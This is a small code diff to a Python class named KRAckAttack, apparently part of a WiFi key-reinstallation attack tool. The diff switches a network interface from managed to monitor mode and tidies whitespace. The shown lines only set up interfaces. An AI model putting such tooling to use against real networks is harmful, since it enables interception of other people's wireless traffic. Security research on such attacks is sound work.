@@ -857,7 +857,7 @@ class KRAckAttack():
 
 		# 2. Configure monitor mode on interfaces
 		subprocess.check_output(["ifconfig", self.nic_real, "down"])
-		subprocess.check_output(["iwconfig", self.nic_real, "mode", "managed"])
+		subprocess.check_output(["iwconfig", self.nic_real, "mode", "monitor"])
 		if self.nic_rogue_mon is None:
 			self.nic_rogue_mon = self.nic_rogue_ap + "mon"
 			subprocess.check_output(["iw", self.nic_rogue_ap, "interface", "add", self.nic_rogue_mon, "type", "monitor"])
@@ -865,7 +865,7 @@ class KRAckAttack():
 			# sequence of commands to assure the virtual interface is registered as a 802.11 monitor interface.
 			subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
 			time.sleep(0.2)
-			
+
 		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "down"])
 		subprocess.check_output(["iwconfig", self.nic_rogue_mon, "mode", "monitor"])
 		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
